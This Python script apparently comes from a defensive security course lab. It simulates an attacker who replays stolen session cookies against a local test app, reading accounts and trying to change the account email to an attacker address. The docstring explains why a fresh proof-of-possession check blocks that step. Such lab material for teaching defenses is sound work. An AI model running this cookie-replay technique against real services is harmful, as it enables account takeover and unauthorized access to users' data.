"""Round 4 attack — stolen session-cookie replay.

The hardest case, and the honest limit of login-time defenses. ~31% of
infostealer-harvested credentials in 2025 came bundled with a live session cookie
(Recorded Future). With the cookie, the attacker never logs in at all: no password,
no MFA, no risk engine. They attach the cookie and read the account.

What this round shows is both halves of the truth: the replay *reads* the account
every time, because the session is genuine — but the sensitive email change is
refused, because L4 demands a fresh proof of possession the cookie thief does not
have. Stopping the read itself needs device-bound sessions (DBSC), passkeys, or
session-anomaly models — the subject of W2 Ch7 and W4.
"""

from __future__ import annotations

import asyncio

import httpx

from _common import BASE_URL, edge_headers, load_json, require_local_target

ATTACKER_IP = "198.51.100.60"
ACTOR = "bot:round4"


async def run() -> dict:
    require_local_target(BASE_URL)
    sessions = [s for s in load_json("stolen_sessions.json") if s.get("cookie")]
    reads = 0
    sensitive = 0

    async with httpx.AsyncClient(base_url=BASE_URL, timeout=10.0) as client:
        for s in sessions:
            headers = edge_headers(ACTOR, ATTACKER_IP)
            headers["Cookie"] = s["cookie"]
            try:
                r = await client.get("/api/account", headers=headers)
                if r.status_code == 200:
                    reads += 1
                r2 = await client.post("/api/account/email",
                                       json={"new_email": "attacker@evil.example"},
                                       headers=headers)
                if r2.status_code == 200 and r2.json().get("status") == "ok":
                    sensitive += 1
            except httpx.RequestError:
                pass

    return {"attack": ACTOR, "attempts": len(sessions), "accounts_read": reads,
            "sensitive_actions": sensitive, "accounts_taken_over": sensitive}


def main():
    result = asyncio.run(run())
    print(f"[{result['attack']}] {result['attempts']} stolen cookies -> "
          f"{result['accounts_read']} accounts read, "
          f"{result['sensitive_actions']} sensitive actions succeeded")


if __name__ == "__main__":
    main()
